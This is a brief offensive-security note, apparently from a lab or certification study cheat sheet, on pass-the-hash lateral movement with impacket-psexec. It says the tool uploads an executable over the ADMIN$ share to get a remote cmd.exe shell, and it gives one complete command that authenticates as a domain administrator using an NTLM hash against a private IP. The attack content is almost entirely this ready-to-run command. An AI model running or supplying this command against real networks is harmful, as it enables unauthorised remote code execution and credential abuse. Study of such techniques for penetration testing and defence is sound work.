### PTH with impacket-psexec

Uses ADMIN$ share for connectivity.  Uploads exe and executes it.  Once executed, cmd.exe screen opens up on kali as domain user.

```bash
impacket-psexec corp1/administrator@192.168.134.5 -hashes :2892d26cdf84d7a70e2eb3b9f05c425e "C:\\windows\\system32\\cmd.exe"
```

